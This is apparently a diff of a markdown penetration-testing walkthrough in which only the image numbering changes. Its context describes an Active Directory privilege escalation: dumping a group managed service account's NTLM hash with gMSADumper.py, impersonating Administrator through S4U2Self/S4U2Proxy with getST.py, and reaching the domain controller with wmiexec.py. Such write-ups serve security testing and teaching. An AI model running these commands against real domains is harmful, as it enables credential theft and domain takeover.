@@ -28,21 +28,23 @@ By collecting Active Directory dump and downloading it to the Bloodhound databas
 
 TED.graves can control the service account through the Group Managed Service Accounts functionality (GMSA), while having the ability to get password or NTLM belonging to SVC_INT user.
 
+![Image](/img/evil_dns/6.png)
+
 ```
 python3 gMSADumper.py -u username -p password -d domain.ru
 ```
 
-![Image](/img/evil_dns/6.png)
+![Image](/img/evil_dns/7.png)
 
 SVC_INT user has the ability to request a service ticket and impersonate it for any user. Using in this case, the S4U2SELF/S4U2Proxy mechanism can be obtained by the privileges of the domain administrator.
 
-![Image](/img/evil_dns/7.png)
+![Image](/img/evil_dns/8.png)
 
 ```
 getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password'  -hashes :NTLM-hash -impersonate Administrator
 ```
 
-![Image](/img/evil_dns/8.png)
+![Image](/img/evil_dns/9.png)
 
 After receiving the service ticket and export it to the environment, you can use the wmiexec.py to get interactive access to domain controller
 
